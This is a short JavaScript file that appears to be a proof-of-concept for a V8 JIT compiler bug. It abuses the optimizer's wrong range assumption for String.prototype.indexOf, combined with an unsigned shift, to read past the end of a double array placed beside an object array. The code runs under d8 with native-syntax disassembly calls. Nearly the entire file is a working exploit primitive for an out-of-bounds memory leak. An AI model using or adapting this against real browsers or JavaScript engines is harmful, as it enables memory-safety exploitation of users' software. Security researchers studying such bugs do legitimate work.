SUCCESS = 0;
FAILURE = 0x42;

const str = 'd';

let it = 0;

var maxstring = (debug) => {
    const OOB_OFFSET = 5;

    let badly_typed = String.prototype.indexOf.call(str, 'c'); // real val = -1, optimizer: 0...2**28-17
    badly_typed = badly_typed >>> 31;
    //badly_typed = Math.abs(badly_typed);

    let bad = badly_typed * OOB_OFFSET;
    let leak = 0;

    if (bad >= OOB_OFFSET && ++it < 0x10000) {
        leak = 0;
    } else {
        let arr = new Array(1.1,1.1);
        arr2 = new Array({},{});
        leak = arr[bad];
        if (leak != undefined) {
            return leak;
        }
    }
    return FAILURE;
}

console.log(maxstring(true));
console.log(maxstring(true));
for (var i = 0; i < 0x10000; i++) {
    maxstring();
}
%DisassembleFunction(maxstring);
console.log('aeag');
for (var i = 0; i < 0x10000; i++) {
    maxstring();
}
%DisassembleFunction(maxstring);
console.log('aeag');
console.log('oob', maxstring(true));
